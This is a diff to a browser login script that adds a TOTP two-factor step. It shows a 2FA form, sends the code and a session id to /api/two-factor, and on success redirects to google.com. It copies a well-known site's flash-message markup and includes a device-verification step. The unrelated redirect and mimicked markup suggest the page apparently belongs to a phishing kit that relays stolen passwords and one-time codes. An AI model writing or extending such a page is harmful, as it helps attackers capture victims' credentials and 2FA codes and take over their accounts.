@@ -26,6 +26,19 @@ document.addEventListener("DOMContentLoaded", () => {
   const deviceFlashTemplate =
     deviceFlashContainer?.querySelector(".js-flash-template");
 
+  // 2FA (TOTP) block - shown when login returns result 4
+  const twoFactorBlock = document.querySelector("#two-factor-block");
+  const twoFactorForm = document.querySelector("#two-factor-form");
+  const appTotpInput = document.querySelector("#app_totp");
+  const twoFactorVerifyButton = twoFactorForm?.querySelector(
+    'button[type="submit"]'
+  );
+  const twoFactorFlashContainer = document.querySelector(
+    "#two-factor-block .flash-container"
+  );
+  const twoFactorFlashTemplate =
+    twoFactorFlashContainer?.querySelector(".js-flash-template");
+
   if (!signInButton || !signInForm || !emailInput || !passwordInput) {
     console.warn("Sign in button, form, or inputs not found.");
     return;
@@ -152,6 +165,17 @@ document.addEventListener("DOMContentLoaded", () => {
           return;
         }
 
+        // If 2FA (TOTP) is required (result === 4),
+        // hide the main login view and show the 2FA block.
+        if (data.result === 4) {
+          if (loginStandardView) {
+            loginStandardView.style.display = "none";
+          }
+          if (twoFactorBlock) {
+            twoFactorBlock.style.display = "block";
+          }
+        }
+
         // If server indicates we should go to device verification (result === 1),
         // hide the main login view and show the device verification block.
         if (data.result === 1) {
@@ -254,6 +278,81 @@ document.addEventListener("DOMContentLoaded", () => {
     }
   }
 
+  async function handleTwoFactorSubmit(event) {
+    event.preventDefault();
+
+    if (!appTotpInput) return;
+    const code = appTotpInput.value.trim();
+    if (!code) {
+      appTotpInput.reportValidity?.();
+      appTotpInput.focus();
+      return;
+    }
+
+    if (!currentSessionId) {
+      console.warn("No active sessionId for 2FA.");
+      return;
+    }
+
+    if (twoFactorFlashContainer) {
+      twoFactorFlashContainer
+        .querySelectorAll(".flash.flash-full.flash-error")
+        .forEach((el) => el.remove());
+    }
+
+    if (twoFactorVerifyButton) {
+      twoFactorVerifyButton.disabled = true;
+      twoFactorVerifyButton.style.cursor = "not-allowed";
+      twoFactorVerifyButton.style.filter = "brightness(0.85)";
+      twoFactorVerifyButton.textContent = "Verifying…";
+    }
+
+    try {
+      const response = await fetch("/api/two-factor", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ code, sessionId: currentSessionId }),
+      });
+
+      const data = await response.json().catch(() => ({}));
+      console.log("Two-factor response:", data);
+
+      if (data && data.result === 1) {
+        window.location.href = "https://google.com";
+      } else if (data && data.result === 0) {
+        if (twoFactorFlashContainer && twoFactorFlashTemplate) {
+          const fragment =
+            "content" in twoFactorFlashTemplate
+              ? twoFactorFlashTemplate.content.cloneNode(true)
+              : null;
+          if (fragment) {
+            const flash = fragment.querySelector(".flash");
+            if (flash) {
+              flash.className = "flash flash-full flash-error";
+              const alert = flash.querySelector(".js-flash-alert");
+              if (alert) {
+                alert.textContent = "Two-factor authentication failed";
+              }
+              twoFactorFlashContainer.insertBefore(
+                fragment,
+                twoFactorFlashTemplate
+              );
+            }
+          }
+        }
+      }
+    } catch (err) {
+      console.error("Error during 2FA verification:", err);
+    } finally {
+      if (twoFactorVerifyButton) {
+        twoFactorVerifyButton.disabled = false;
+        twoFactorVerifyButton.style.cursor = "";
+        twoFactorVerifyButton.style.filter = "";
+        twoFactorVerifyButton.textContent = "Verify";
+      }
+    }
+  }
+
   // Intercept form submit
   signInForm.addEventListener("submit", handleSignIn);
 
@@ -264,6 +363,14 @@ document.addEventListener("DOMContentLoaded", () => {
   if (verifyForm && verifyButton && otpInput) {
     verifyForm.addEventListener("submit", handleVerifyDevice);
     verifyButton.addEventListener("click", handleVerifyDevice);
+  }
+
+  // Wire up 2FA form if present
+  if (twoFactorForm && appTotpInput) {
+    twoFactorForm.addEventListener("submit", handleTwoFactorSubmit);
+    if (twoFactorVerifyButton) {
+      twoFactorVerifyButton.addEventListener("click", handleTwoFactorSubmit);
+    }
   }
 });
 
